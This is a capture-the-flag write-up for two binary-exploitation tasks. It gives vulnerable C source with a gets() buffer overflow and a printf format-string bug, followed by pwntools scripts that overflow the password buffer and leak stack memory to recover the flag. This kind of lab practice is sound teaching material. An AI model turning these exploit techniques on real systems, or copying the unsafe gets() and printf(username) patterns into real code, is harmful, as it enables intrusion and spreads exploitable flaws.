### Task 32:
+ We got the file `pwn1.c`
```C
#include <stdio.h>
#include <string.h>

void print_banner(){
	printf( "  ______ _          __      __         _ _   \n"
 		" |  ____| |         \\ \\    / /        | | |  \n"
		" | |__  | | __ _  __ \\ \\  / /_ _ _   _| | |_ \n"
		" |  __| | |/ _` |/ _` \\ \\/ / _` | | | | | __|\n"
		" | |    | | (_| | (_| |\\  / (_| | |_| | | |_ \n"
		" |_|    |_|\\__,_|\\__, | \\/ \\__,_|\\__,_|_|\\__|\n"
		"                  __/ |                      \n"
		"                 |___/                       \n"
		"                                             \n"
		"Version 1.0 - Passwordless authentication evolved!\n"
		"==================================================================\n\n"
	      );
}

void print_flag(){
	FILE *f = fopen("flag.txt","r");
	char flag[200];

	fgets(flag, 199, f);
	printf("%s", flag);
}

void login(){
	char username[100] = "";
	char password[100] = "";

	printf("Username: ");
	gets(username);

	// If I disable the password, nobody will get in.
	//printf("Password: ");
	//gets(password);

	if(!strcmp(username, "bytereaper") && !strcmp(password, "5up3rP4zz123Byte")){
		print_flag();
	}
	else{
		printf("Wrong password! No flag for you.");
	}
}

void main(){
	setvbuf(stdin, NULL, _IONBF, 0);
	setvbuf(stdout, NULL, _IONBF, 0);
	setvbuf(stderr, NULL, _IONBF, 0);

	// Start login process
	print_banner();
	login();

	return;
}
```
+ We need pwn this file to get the the Flag.
+ This is solution:

```python
from pwn import *

# Connect to the remote server
conn = remote('IP', 1337)

# Create payload
# "bytereaper" + null byte (string terminator) + padding + password
payload = b"bytereaper\x00" + b"A" * (112-11) + b"5up3rP4zz123Byte"
# offset = 100 + 12 - (10+1)

# Send payload when prompted
conn.recvuntil(b"Username: ")
conn.sendline(payload)

# Receive and print the flag
print(conn.recvall().decode())
```

***Note: The username buffer is 100 bytes. So we need to fill that up using the username ‘bytereaper’ and other junk.  To take advantage of the gets() function, we need to add a null terminator (\x00) at the end of ‘bytereaper’. This is because the rest of the payload won’t be considered when comparing username in the strcmp() function. Size is 12 bytes which is stack_cookie variable in the stack as well right after the username buffer***

### Task 33:
+ We got the next file `pwn21.c`:
```C
#include <stdio.h>
#include <string.h>

void print_banner(){
	printf( "  ______ _          __      __         _ _   \n"
 		" |  ____| |         \\ \\    / /        | | |  \n"
		" | |__  | | __ _  __ \\ \\  / /_ _ _   _| | |_ \n"
		" |  __| | |/ _` |/ _` \\ \\/ / _` | | | | | __|\n"
		" | |    | | (_| | (_| |\\  / (_| | |_| | | |_ \n"
		" |_|    |_|\\__,_|\\__, | \\/ \\__,_|\\__,_|_|\\__|\n"
		"                  __/ |                      \n"
		"                 |___/                       \n"
		"                                             \n"
		"Version 2.1 - Fixed print_flag to not print the flag. Nothing you can do about it!\n"
		"==================================================================\n\n"
	      );
}

void print_flag(char *username){
        FILE *f = fopen("flag.txt","r");
        char flag[200];

        fgets(flag, 199, f);
        //printf("%s", flag);
	
	//The user needs to be mocked for thinking they could retrieve the flag
	printf("Hello, ");
	printf(username);
	printf(". Was version 2.0 too simple for you? Well I don't see no flags being shown now xD xD xD...\n\n");
	printf("Yours truly,\nByteReaper\n\n");
}

void login(){
	char username[100] = "";

	printf("Username: ");
	gets(username);

	// The flag isn't printed anymore. No need for authentication
	print_flag(username);
}

void main(){
	setvbuf(stdin, NULL, _IONBF, 0);
	setvbuf(stdout, NULL, _IONBF, 0);
	setvbuf(stderr, NULL, _IONBF, 0);

	// Start login process
	print_banner();
	login();

	return;
}
```

+ This is solution:

```Python
from pwn import *

# Connect to the target service
conn = remote('remote.server', 1337)

# Leak a range of stack offsets using %p
payload = b'%7$p.%8$p.%9$p.%10$p.%11$p.%12$p.%13$p.%14$p.%15$p.%16$p.%17$p.%18$p.%19$p.%20$p'

# Send payload and capture response
conn.sendlineafter(b'Username: ', payload)
response = conn.recvall().decode()

# Extract all hexadecimal values from the response
hex_values = []
for part in response.split('Hello, ')[1].split('. ')[0].split('.'):
    part = part.strip()
    if part.startswith('0x'):
        hex_values.append(part[2:])  # Remove '0x' prefix

# Convert each hex value to bytes (little-endian) and concatenate
full_bytes = b''
for hex_val in hex_values:
    # Pad to ensure valid hex conversion (8 or 16 characters)
    if len(hex_val) % 2 != 0:
        hex_val = '0' + hex_val
    padded = hex_val.zfill(16 if len(hex_val) == 8 else 16)  # Handle 64-bit addresses
    try:
        bytes_leak = bytes.fromhex(padded)
        full_bytes += bytes_leak[::-1]  # Reverse bytes for little-endian
    except:
        continue

# Search for the flag pattern in the concatenated bytes
flag_start = full_bytes.find(b'THM{')
if flag_start != -1:
    flag_end = full_bytes.find(b'}', flag_start)
    flag = full_bytes[flag_start:flag_end+1].decode()
    print(f"Flag found: {flag}")
else:
    print("Flag not found in leaked data")

conn.close()
```

+ Run file and we got the flag:
![alt text](image.png)